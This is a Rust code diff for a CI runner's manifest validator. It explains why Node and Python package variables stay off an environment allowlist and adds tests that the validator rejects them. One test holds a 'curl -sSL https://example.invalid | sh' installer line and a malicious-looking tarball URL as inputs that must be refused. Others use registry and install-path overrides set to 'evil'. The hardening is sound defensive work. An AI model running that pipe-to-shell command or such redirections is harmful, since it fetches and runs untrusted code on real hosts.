@@ -60,6 +60,42 @@ const ENV_ALLOWLIST: &[&str] = &[
     // exactly the thing a small host runs out of, so a manifest must be able
     // to trade backtrace quality for headroom the way the Actions lane does.
     "CARGO_PROFILE_TEST_DEBUG",
+    //
+    // ── NOTHING WAS ADDED FOR THE NODE/PYTHON REGISTRY ENTRIES ───────────
+    //
+    // Opening the tool registry to node/npm and to Python packages
+    // (`ci_node::tools`) raised the obvious question of whether that ecosystem
+    // needs its own keys here — `POETRY_*`, `npm_config_*`, `PIP_*`,
+    // `PYTHONPATH`. The answer is NO, on two independent grounds, and it is
+    // recorded rather than left as an absence.
+    //
+    // 1. THE EXISTING BAR IS NOT MET. Every entry above is set by a LIVE gate
+    //    step in an Actions workflow this lane must agree with; nothing was
+    //    added speculatively. Re-checked 2026-08-18 across
+    //    qontinui/.github/workflows, qontinui-web/.github/workflows,
+    //    qontinui-schemas/.github/workflows and qontinui-runner/.github/
+    //    workflows: not one `POETRY_*`, `npm_config_*`, `NPM_*` or `PIP_*`
+    //    variable is set by any step. The poetry jobs are plain
+    //    `poetry install` / `poetry run …`; the node jobs are plain
+    //    `pnpm …`. Adding a key "because the ecosystem has one" is exactly the
+    //    batch approval this boundary forbids.
+    //
+    // 2. THE ONES THAT WOULD MATTER ARE THE FORBIDDEN CLASS ANYWAY.
+    //    `npm_config_prefix`, `npm_config_cache`, `PIP_TARGET`,
+    //    `PIP_INDEX_URL`, `POETRY_VIRTUALENVS_PATH` and `PYTHONPATH` all
+    //    redirect where a tool RESOLVES or INSTALLS things — the same class as
+    //    PATH, CARGO_HOME and LD_PRELOAD, which this list exists to keep out
+    //    of a manifest's hands. The provisioned tool's own layout is owned by
+    //    the executor, the way it already owns PATH and CARGO_TARGET_DIR: the
+    //    registry installs into a version-keyed cache and puts exactly that
+    //    directory on the front of PATH. A manifest that could re-point the
+    //    prefix could un-provision the tool it just declared.
+    //
+    // A project's dependency install stays a STEP (`npm ci`, `poetry
+    // install`), which needs no env at all — it is repo-scoped and
+    // lockfile-pinned. `NODE_OPTIONS`/`NODE_ENV`/`CI` above already cover what
+    // those steps legitimately tune. The test
+    // `ecosystem_env_still_outside_the_allowlist` pins this decision.
 ];
 
 /// Env vars the EXECUTOR owns and exports itself. A step setting one of
@@ -209,6 +245,22 @@ fn default_sibling_branch() -> String {
 /// than the argv rules — a repo can already run whatever it likes as a step,
 /// but it must not be able to make the RUNNER fetch and cache an arbitrary
 /// binary under a name that later steps resolve implicitly.
+///
+/// # Why this is still a flat `{name, version}` pair
+///
+/// Opening the registry to node raised the question of whether this needs a
+/// shape for "a runtime PLUS its package manager" — `node 22` *with* `npm`.
+/// It does not, and the decision is deliberate rather than inherited:
+/// **npm's version is a property of the node release, not an independently
+/// pinnable thing**, so a second version field would be a knob with nothing on
+/// the other end (`actions/setup-node` behaves the same way). The
+/// runtime-plus-ecosystem shape therefore lives in the REGISTRY — see
+/// `ci_node::tools::Installer::PrebuiltTree`'s `companions`, which are checked
+/// to exist and to run at provisioning time and whose versions are logged.
+///
+/// Keeping this pair flat also keeps `deny_unknown_fields` meaningful: every
+/// key a manifest may write here is one of exactly two, and any third is a
+/// hard parse error rather than a silently ignored hint.
 #[derive(Debug, Clone, Deserialize)]
 #[serde(deny_unknown_fields)]
 pub(crate) struct CiTool {
@@ -823,6 +875,91 @@ timeout_secs = 7200
         .unwrap();
         assert_eq!(m.tools.len(), 1);
         assert_eq!(m.tools[0].name, "cargo-nextest");
+    }
+
+    /// The ecosystems the registry gained do NOT widen this boundary. Each of
+    /// these redirects where a tool resolves or installs things — the same
+    /// class as PATH/CARGO_HOME/LD_PRELOAD — and none is set by any live
+    /// Actions gate step, so none was added. See the decision block on
+    /// `ENV_ALLOWLIST`.
+    #[test]
+    fn ecosystem_env_still_outside_the_allowlist() {
+        for key in [
+            "npm_config_prefix",
+            "npm_config_cache",
+            "npm_config_registry",
+            "NPM_CONFIG_PREFIX",
+            "POETRY_VIRTUALENVS_PATH",
+            "POETRY_HOME",
+            "PIP_TARGET",
+            "PIP_INDEX_URL",
+            "PYTHONPATH",
+            "VIRTUAL_ENV",
+        ] {
+            let text = format!(
+                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"evil\" }}\n"
+            );
+            let err = parse_and_validate(&text).unwrap_err();
+            assert!(err.contains("not allowlisted"), "{key}: got {err}");
+        }
+    }
+
+    /// The curated entries the registry gained are declarable with a pinned
+    /// version — that is Phase 1's whole point.
+    #[test]
+    fn curated_ecosystem_tools_are_declarable() {
+        for (name, version) in [
+            ("node", "22.11.0"),
+            ("poetry", "2.1.3"),
+            ("twine", "6.1.0"),
+            ("datamodel-code-generator", "0.28.5"),
+        ] {
+            let text = format!(
+                "version = 1\n[[tools]]\nname = {name:?}\nversion = {version:?}\n\
+                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
+            );
+            let m = parse_and_validate(&text)
+                .unwrap_or_else(|e| panic!("{name} must be declarable, got: {e}"));
+            assert_eq!(m.tools[0].name, name);
+            assert_eq!(m.tools[0].version, version);
+        }
+    }
+
+    /// Opening the registry did not open the DOOR: a `[[tools]]` entry still
+    /// has exactly two keys, so a URL (or an installer command) has nowhere to
+    /// live — `deny_unknown_fields` makes it a hard parse error.
+    #[test]
+    fn a_tool_entry_can_never_express_a_url_or_an_installer() {
+        for extra in [
+            "url = \"https://example.invalid/evil.tar.gz\"",
+            "install = \"curl -sSL https://example.invalid | sh\"",
+            "index_url = \"https://example.invalid/simple\"",
+            "distribution = \"evil\"",
+        ] {
+            let text = format!(
+                "version = 1\n[[tools]]\nname = \"node\"\nversion = \"22.11.0\"\n{extra}\n\
+                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
+            );
+            let err = parse_and_validate(&text).unwrap_err();
+            assert!(err.contains("parse error"), "{extra}: got {err}");
+        }
+    }
+
+    /// `latest` stays a validation error for EVERY curated entry, not just the
+    /// one the rule was written for.
+    #[test]
+    fn latest_rejected_for_every_curated_tool() {
+        for name in super::super::tools::known_tool_names() {
+            let text = format!(
+                "version = 1\n[[tools]]\nname = {name:?}\nversion = \"latest\"\n\
+                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
+            );
+            let err = parse_and_validate(&text).unwrap_err();
+            assert!(
+                err.contains("must be an exact version"),
+                "{name}: got {err}"
+            );
+        }
     }
 
     /// The registry is CLOSED — a manifest names a tool, it never supplies a
